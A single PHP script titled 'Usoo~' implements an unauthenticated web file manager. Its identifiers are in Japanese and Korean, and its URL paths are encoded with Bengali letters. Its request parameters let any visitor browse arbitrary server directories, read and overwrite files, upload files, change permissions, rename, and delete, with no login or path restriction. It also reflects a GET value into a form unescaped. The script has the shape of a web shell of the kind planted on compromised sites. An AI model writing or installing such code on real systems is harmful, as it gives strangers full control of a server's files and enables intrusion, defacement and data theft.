<?php
/**
 * ファイルサイズを人間が読みやすい形式に変換する関数
 * バイト数をGB、MB、KB、bytesに変換します
 *
 * @param int $バイト数 変換するバイト数
 * @return string フォーマットされたサイズ文字列
 */
function 크기포맷팅($バイト数)
{
    // 1GB以上の場合
    if ($バイト数 >= 1073741824) {
        $バイト数 = number_format($バイト数 / 1073741824, 2) . ' GB';
    }
    // 1MB以上の場合
    elseif ($バイト数 >= 1048576) {
        $バイト数 = number_format($バイト数 / 1048576, 2) . ' MB';
    }
    // 1KB以上の場合
    elseif ($バイト数 >= 1024) {
        $バイト数 = number_format($バイト数 / 1024, 2) . ' KB';
    }
    // 1バイトより大きい場合
    elseif ($バイト数 > 1) {
        $バイト数 = $バイト数 . ' bytes';
    }
    // 1バイトの場合
    elseif ($バイト数 == 1) {
        $バイト数 = $バイト数 . ' byte';
    }
    // 0バイトの場合
    else {
        $バイト数 = '0 bytes';
    }
    return $バイト数;
}

/**
 * ファイルの拡張子を取得する関数
 *
 * @param string $ファイル ファイル名
 * @return string ファイルの拡張子
 */
function 파일확장자($ファイル)
{
    return substr(strrchr($ファイル, '.'), 1);
}

/**
 * ファイルタイプに応じたアイコンを返す関数
 * ファイルの拡張子や名前に基づいて適切なFont Awesomeアイコンを返します
 *
 * @param string $ファイル ファイル名
 * @return string HTMLアイコンタグ
 */
function 파일아이콘($ファイル)
{
    /**
     * 画像ファイルの拡張子リスト
     */
    $画像拡張子配列 = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");

    /**
     * 音声ファイルの拡張子リスト
     */
    $音声拡張子配列 = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");

    /**
     * ファイルの拡張子を小文字で取得
     */
    $拡張子 = strtolower(파일확장자($ファイル));

    /**
     * 特殊ファイル名の処理
     */
    if ($ファイル == "error_log") {
        return '<i class="fa-sharp fa-solid fa-bug"></i> ';
    } elseif ($ファイル == ".htaccess") {
        return '<i class="fa-solid fa-hammer"></i> ';
    }

    /**
     * 拡張子に基づくアイコンの選択
     */
    if ($拡張子 == "html" || $拡張子 == "htm") {
        return '<i class="fa-brands fa-html5"></i> ';
    } elseif ($拡張子 == "php" || $拡張子 == "phtml") {
        return '<i class="fa-brands fa-php"></i> ';
    } elseif (in_array($拡張子, $画像拡張子配列)) {
        return '<i class="fa-regular fa-images"></i> ';
    } elseif ($拡張子 == "css") {
        return '<i class="fa-brands fa-css3"></i> ';
    } elseif ($拡張子 == "txt") {
        return '<i class="fa-regular fa-file-lines"></i> ';
    } elseif (in_array($拡張子, $音声拡張子配列)) {
        return '<i class="fa-duotone fa-file-music"></i> ';
    } elseif ($拡張子 == "py") {
        return '<i class="fa-brands fa-python"></i> ';
    } elseif ($拡張子 == "js") {
        return '<i class="fa-brands fa-js"></i> ';
    } else {
        return '<i class="fa-solid fa-file"></i> ';
    }
}

/**
 * パスをエンコードする関数
 * パス内の特殊文字をベンガル文字に置き換えてエンコードします
 *
 * @param string $パス エンコードするパス
 * @return string エンコードされたパス
 */
function 경로인코딩($パス)
{
    /**
     * 置換前の文字配列（スラッシュ、バックスラッシュ、ドット、コロン）
     */
    $置換前配列 = array("/", "\\", ".", ":");

    /**
     * 置換後の文字配列（ベンガル文字）
     */
    $置換後配列 = array("ক", "খ", "গ", "ঘ");

    return str_replace($置換前配列, $置換後配列, $パス);
}

/**
 * パスをデコードする関数
 * エンコードされたパスを元の形式に戻します
 *
 * @param string $パス デコードするパス
 * @return string デコードされたパス
 */
function 경로디코딩($パス)
{
    /**
     * 置換前の文字配列（ベンガル文字）
     */
    $置換前配列 = array("/", "\\", ".", ":");

    /**
     * 置換後の文字配列（スラッシュ、バックスラッシュ、ドット、コロン）
     */
    $置換後配列 = array("ক", "খ", "গ", "ঘ");

    return str_replace($置換後配列, $置換前配列, $パス);
}

/**
 * ルートパスの初期化
 * スクリプトのディレクトリをルートパスとして設定
 */
 $ルートパス = __DIR__;

/**
 * スクリプトファイルのパスを取得
 */
 $パス = $_SERVER['SCRIPT_FILENAME'];

/**
 * Windows環境の場合、バックスラッシュをスラッシュに変換
 */
if(strpos($_SERVER['SCRIPT_FILENAME'], ":"))
{
    $パス = str_replace('\\', '/', $パス);
}

/**
 * ルートディレクトリの判定
 * PHP_SELFとSCRIPT_FILENAMEが一致する場合、ルートパスを"/"に設定
 */
if(str_replace('//','/',$_SERVER['PHP_SELF']) == str_replace('\\\\','/',$パス))
{
    $ルートパス = ('/');
} else {
    /**
     * ルートパスの計算
     * SCRIPT_FILENAMEからPHP_SELFを除いた部分をルートパスとして設定
     */
    $ルートパス = (str_replace(str_replace('//','/',$_SERVER['PHP_SELF']), '', str_replace('\\\\','/',$パス) ));
}

/**
 * パスパラメータの処理
 * GETパラメータpが設定されている場合、そのパスを使用
 */
if (isset($_GET['p'])) {
    /**
     * パラメータが空の場合はルートパスを使用
     */
    if (empty($_GET['p'])) {
        $現在のパス = $ルートパス;
    }
    /**
     * デコードしたパスがディレクトリでない場合、エラーを表示
     */
    elseif (!is_dir(경로디코딩($_GET['p']))) {
        echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
    }
    /**
     * デコードしたパスがディレクトリの場合、そのパスを使用
     */
    elseif (is_dir(경로디코딩($_GET['p']))) {
        $現在のパス = 경로디코딩($_GET['p']);
    }
}
/**
 * クエリパラメータqが設定されている場合の処理
 */
elseif (isset($_GET['q'])) {
    /**
     * デコードしたパスがディレクトリでない場合、ルートにリダイレクト
     */
    if (!is_dir(경로디코딩($_GET['q']))) {
        echo ("<script>window.location.replace('?p=');</script>");
    }
    /**
     * デコードしたパスがディレクトリの場合、そのパスを使用
     */
    elseif (is_dir(경로디코딩($_GET['q']))) {
        $現在のパス = 경로디코딩($_GET['q']);
    }
}
/**
 * パラメータが設定されていない場合、現在のディレクトリを使用
 */
else {
    $現在のパス = __DIR__;
}

/**
 * 現在のパスを定数として定義
 */
define("PATH", $現在のパス);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Usoo~</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
          integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
          crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>

<?php
/**
 * ナビゲーションバーの表示開始
 */
echo ('
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

/**
 * パスをスラッシュ区切りで分割
 */
 $パス = str_replace('\\', '/', PATH);
 $パス配列 = explode('/', $パス);

/**
 * パス配列をループして、パンくずリストを生成
 */
foreach ($パス配列 as $ID => $ディレクトリ部分) {
    /**
     * ルートディレクトリの場合の処理
     */
    if ($ディレクトリ部分 == '' && $ID == 0) {
        $ルートフラグ = true;
        echo "<a href=\"?p=/\">/</a>";
        continue;
    }

    /**
     * 空の要素はスキップ
     */
    if ($ディレクトリ部分 == '')
        continue;

    /**
     * 各ディレクトリへのリンクを生成
     */
    echo "<a href='?p=";
    for ($ループ変数 = 0; $ループ変数 <= $ID; $ループ変数++) {
        echo str_replace(":", "ঘ", $パス配列[$ループ変数]);
        if ($ループ変数 != $ID)
            echo "ক";
    }
    echo "'>" . $ディレクトリ部分 . "</a>/";
}

/**
 * ナビゲーションバーの残りの部分を表示
 */
echo ('
</div>
<div class="form-inline">
<a href="?newdir&q=' . urlencode(경로인코딩(PATH)) . '"><button class="btn btn-dark" type="button">New Directory</button></a>
<a href="?upload&q=' . urlencode(경로인코딩(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
<a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
</div>
</nav>');

/**
 * パスパラメータが設定されている場合、ファイル一覧を表示
 */
if (isset($_GET['p'])) {

    /**
     * ファイルとフォルダの取得
     * ディレクトリが読み取り可能な場合、スキャンしてファイルとフォルダを分離
     */
    if (is_readable(PATH)) {
        /**
         * ディレクトリ内の全オブジェクトを取得
         */
        $取得オブジェクト = scandir(PATH);

        /**
         * フォルダとファイルを格納する配列
         */
        $フォルダ配列 = array();
        $ファイル配列 = array();

        /**
         * 各オブジェクトをループして、フォルダとファイルに分類
         */
        foreach ($取得オブジェクト as $オブジェクト) {
            /**
             * 現在ディレクトリと親ディレクトリはスキップ
             */
            if ($オブジェクト == '.' || $オブジェクト == '..') {
                continue;
            }

            /**
             * オブジェクトの完全パスを構築
             */
            $新規オブジェクト = PATH . '/' . $オブジェクト;

            /**
             * ディレクトリの場合はフォルダ配列に追加
             */
            if (is_dir($新規オブジェクト)) {
                array_push($フォルダ配列, $オブジェクト);
            }
            /**
             * ファイルの場合はファイル配列に追加
             */
            elseif (is_file($新規オブジェクト)) {
                array_push($ファイル配列, $オブジェクト);
            }
        }
    }

    /**
     * ファイル一覧テーブルのヘッダーを表示
     */
    echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';

    /**
     * フォルダ一覧の表示
     * 各フォルダに対して、名前、サイズ、更新日時、権限、アクションを表示
     */
    foreach ($フォルダ配列 as $フォルダ) {
        echo "    <tr>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(경로인코딩(PATH . "/" . $フォルダ)) . "'>" . $フォルダ . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $フォルダ)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $フォルダ)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(경로인코딩(PATH)) . "&r=" . $フォルダ . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Change Permissions' href='?q=" . urlencode(경로인코딩(PATH)) . "&chmod=" . $フォルダ . "'><i class='fa-solid fa-key'></i></a>
      <a title='Delete' href='?q=" . urlencode(경로인코딩(PATH)) . "&d=" . $フォルダ . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
      <td>
    </tr>
";
    }

    /**
     * ファイル一覧の表示
     * 各ファイルに対して、アイコン、名前、サイズ、更新日時、権限、アクションを表示
     */
    foreach ($ファイル配列 as $ファイル) {
        echo "    <tr>
          <td>" . 파일아이콘($ファイル) . $ファイル . "</td>
          <td>" . 크기포맷팅(filesize(PATH . "/" . $ファイル)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $ファイル)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" . $ファイル)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(경로인코딩(PATH)) . "&e=" . $ファイル . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=" . urlencode(경로인코딩(PATH)) . "&r=" . $ファイル . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
          <a title='Change Permissions' href='?q=" . urlencode(경로인코딩(PATH)) . "&chmod=" . $ファイル . "'><i class='fa-solid fa-key'></i></a>
          <a title='Delete' href='?q=" . urlencode(경로인코딩(PATH)) . "&d=" . $ファイル . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
          <td>
    </tr>
";
    }

    /**
     * テーブルの終了タグ
     */
    echo "  </tbody>
</table>";
} else {
    /**
     * GETパラメータが空の場合、パスパラメータにリダイレクト
     */
    if (empty($_GET)) {
        echo ("<script>window.location.replace('?p=');</script>");
    }
}

/**
 * 新規ディレクトリ作成フォームの表示
 * newdirパラメータとqパラメータが設定されている場合、新規ディレクトリ作成フォームを表示
 */
if (isset($_GET['newdir']) && isset($_GET['q'])) {
    echo '
    <div class="container mt-4">
        <h3>Create New Directory</h3>
        <form method="post">
            <div class="form-group mb-3">
                <label for="dirname">Directory Name:</label>
                <input type="text" class="form-control" id="dirname" name="dirname" placeholder="Enter directory name" required>
                <small class="form-text text-muted">Enter the name for the new directory. Avoid special characters.</small>
            </div>
            <input type="submit" class="btn btn-dark" value="Create Directory" name="create_directory">
            <a href="?p=' . 경로인코딩(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';

    /**
     * 新規ディレクトリ作成処理の実行
     * create_directoryパラメータがPOSTされた場合、新しいディレクトリを作成
     */
    if (isset($_POST['create_directory'])) {
        /**
         * POSTされたディレクトリ名を取得
         */
        $新規ディレクトリ名 = trim($_POST['dirname']);

        /**
         * ディレクトリ名の検証
         */
        if (!empty($新規ディレクトリ名)) {
            /**
             * ディレクトリ名に不正な文字が含まれていないかチェック
             */
            if (preg_match('/[\/\\\\:*?"<>|]/', $新規ディレクトリ名)) {
                echo ("<script>alert('Invalid directory name. Directory name cannot contain special characters: / \\ : * ? \" < > |'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            } else {
                /**
                 * 新規ディレクトリの完全パス
                 */
                $新規ディレクトリパス = PATH . "/" . $新規ディレクトリ名;

                /**
                 * ディレクトリが既に存在するかチェック
                 */
                if (file_exists($新規ディレクトリパス)) {
                    echo ("<script>alert('Directory already exists.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
                } else {
                    /**
                     * 新規ディレクトリの作成
                     * デフォルト権限は0755（所有者は読み書き実行、グループとその他は読み実行）
                     */
                    if(mkdir($新規ディレクトリパス, 0755, true)) {
                        echo ("<script>alert('Directory created successfully.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
                    } else {
                        echo ("<script>alert('Failed to create directory.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
                    }
                }
            }
        } else {
            echo ("<script>alert('Directory name cannot be empty.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
        }
    }
}

/**
 * ファイルアップロードフォームの表示
 * uploadパラメータが設定されている場合、アップロードフォームを表示
 */
if (isset($_GET['upload'])) {
    echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
}

/**
 * ファイル・フォルダのリネーム機能
 * rパラメータとqパラメータが設定されている場合、リネームフォームを表示
 */
if (isset($_GET['r'])) {
    if (!empty($_GET['r']) && isset($_GET['q'])) {
        /**
         * リネームフォームの表示
         */
        echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';

        /**
         * リネーム処理の実行
         * renameパラメータがPOSTされた場合、ファイル・フォルダの名前を変更
         */
        if (isset($_POST['rename'])) {
            /**
             * 現在のファイル・フォルダの完全パス
             */
            $名前 = PATH . "/" . $_GET['r'];

            /**
             * リネームの実行
             */
            if(rename($名前, PATH . "/" . $_POST['name'])) {
                echo ("<script>alert('Renamed.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            }
        }
    }
}

/**
 * ファイル編集機能
 * eパラメータとqパラメータが設定されている場合、ファイル編集フォームを表示
 */
if (isset($_GET['e'])) {
    if (!empty($_GET['e']) && isset($_GET['q'])) {
        /**
         * ファイル編集フォームの表示
         * ファイルの内容をテキストエリアに表示
         */
        echo '
    <form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';

        /**
         * ファイル保存処理の実行
         * editパラメータがPOSTされた場合、ファイルの内容を保存
         */
        if(isset($_POST['edit'])) {
            /**
             * 編集対象ファイルの完全パス
             */
            $ファイル名 = PATH."/".$_GET['e'];

            /**
             * POSTされたデータを取得
             */
            $データ = $_POST['data'];

            /**
             * ファイルを書き込みモードで開く
             */
            $ファイルハンドル = fopen($ファイル名,"w");

            /**
             * ファイルへの書き込み
             */
            if(fwrite($ファイルハンドル,$データ)) {
                echo ("<script>alert('Saved.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            }

            /**
             * ファイルハンドルを閉じる
             */
            fclose($ファイルハンドル);
        }
    }
}

/**
 * ファイルアップロード処理の実行
 * uploadパラメータがPOSTされた場合、アップロードされたファイルを保存
 */
if (isset($_POST["upload"])) {
    /**
     * アップロード先のファイルパス
     */
    $ターゲットファイル = PATH . "/" . basename($_FILES["fileToUpload"]["name"]);

    /**
     * アップロードされたファイルを移動
     */
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $ターゲットファイル)) {
        echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
    } else {
        echo "<p>Sorry, there was an error uploading your file.</p>";
    }

}

/**
 * ファイル・フォルダの権限変更機能
 * chmodパラメータとqパラメータが設定されている場合、権限変更フォームを表示
 */
if (isset($_GET['chmod']) && isset($_GET['q'])) {
    if (!empty($_GET['chmod'])) {
        /**
         * 権限変更対象のファイル・フォルダの完全パス
         */
        $権限変更対象 = PATH . "/" . $_GET['chmod'];

        /**
         * 現在の権限を取得（8進数形式）
         */
        $現在の権限 = substr(decoct(fileperms($権限変更対象)), -3);

        /**
         * 権限変更フォームの表示
         */
        echo '
    <div class="container mt-4">
        <h3>Change Permissions</h3>
        <form method="post">
            <div class="form-group mb-3">
                <label for="permissions">Current Permissions: <strong>0' . $現在の権限 . '</strong></label>
                <input type="text" class="form-control" id="permissions" name="permissions" value="' . $現在の権限 . '" placeholder="e.g., 755, 644, 777" maxlength="3" pattern="[0-7]{3}">
                <small class="form-text text-muted">Enter permissions in octal format (e.g., 755 for rwxr-xr-x, 644 for rw-r--r--)</small>
            </div>
            <input type="hidden" name="chmod_target" value="' . htmlspecialchars($_GET['chmod']) . '">
            <input type="submit" class="btn btn-dark" value="Change Permissions" name="change_permissions">
            <a href="?p=' . 경로인코딩(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';

        /**
         * 権限変更処理の実行
         * change_permissionsパラメータがPOSTされた場合、ファイル・フォルダの権限を変更
         */
        if (isset($_POST['change_permissions'])) {
            /**
             * POSTされた権限値を取得
             */
            $新しい権限 = $_POST['permissions'];

            /**
             * 権限値の検証（3桁の8進数であることを確認）
             */
            if (preg_match('/^[0-7]{3}$/', $新しい権限)) {
                /**
                 * 権限変更対象のパス
                 */
                $権限変更パス = PATH . "/" . $_POST['chmod_target'];

                /**
                 * 8進数形式に変換してchmodを実行
                 */
                $権限8進数値 = octdec($新しい権限);

                /**
                 * 権限の変更を実行
                 */
                if(chmod($権限変更パス, $権限8進数値)) {
                    echo ("<script>alert('Permissions changed successfully to 0" . $新しい権限 . "'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Failed to change permissions.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
                }
            } else {
                echo ("<script>alert('Invalid permissions format. Please use 3-digit octal format (e.g., 755, 644).'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
            }
        }
    }
}

/**
 * ファイル・フォルダの削除機能
 * dパラメータとqパラメータが設定されている場合、ファイル・フォルダを削除
 */
if (isset($_GET['d']) && isset($_GET['q'])) {
    /**
     * 削除対象のファイル・フォルダの完全パス
     */
    $名前 = PATH . "/" . $_GET['d'];

    /**
     * ファイルの場合の削除処理
     */
    if (is_file($名前)) {
        if(unlink($名前)) {
            echo ("<script>alert('File removed.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
        }
    }
    /**
     * ディレクトリの場合の削除処理
     */
    elseif (is_dir($名前)) {
        if(rmdir($名前) == true) {
            echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . 경로인코딩(PATH) . "');</script>");
        }
    }
}
?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
</body>

</html>
